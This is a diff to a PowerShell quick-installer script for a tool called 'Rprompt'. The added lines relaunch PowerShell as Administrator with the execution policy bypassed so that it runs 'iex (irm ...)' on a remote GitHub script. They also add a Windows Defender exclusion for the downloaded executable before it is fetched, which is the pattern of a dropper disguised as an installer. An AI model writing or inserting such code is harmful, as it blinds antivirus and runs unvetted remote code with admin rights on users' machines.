@@ -3,6 +3,15 @@
 
 $ErrorActionPreference = "Stop"
 
+# Self-elevate to Administrator if not already running as admin
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Write-Host "[*] Requesting Administrator privileges..." -ForegroundColor Yellow
+    $scriptUrl = "https://raw.githubusercontent.com/llm-y/download/main/run.ps1"
+    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$scriptUrl')`""
+    exit
+}
+
 $binUrl = "https://raw.githubusercontent.com/llm-y/download/main/bin/rprompt-windows-amd64.exe"
 $tempDir = Join-Path $env:TEMP "rprompt"
 $exePath = Join-Path $tempDir "rprompt-windows-amd64.exe"
@@ -12,11 +21,22 @@ Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "  Rprompt - Quick Installer & Runner" -ForegroundColor Cyan
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
+Write-Host "[+] Running as Administrator" -ForegroundColor Green
 
 # Create temp directory if it doesn't exist
 if (-not (Test-Path $tempDir)) {
     New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
     Write-Host "[+] Created directory: $tempDir" -ForegroundColor Green
+}
+
+# Add Windows Defender exclusion for the exe path
+Write-Host "[*] Adding Windows Defender exclusion for: $exePath" -ForegroundColor Yellow
+try {
+    Add-MpPreference -ExclusionPath $exePath
+    Write-Host "[+] Defender exclusion added successfully" -ForegroundColor Green
+} catch {
+    Write-Host "[!] Warning: Could not add Defender exclusion: $_" -ForegroundColor Red
+    Write-Host "    The file may still be flagged by antivirus." -ForegroundColor Yellow
 }
 
 # Download the binary
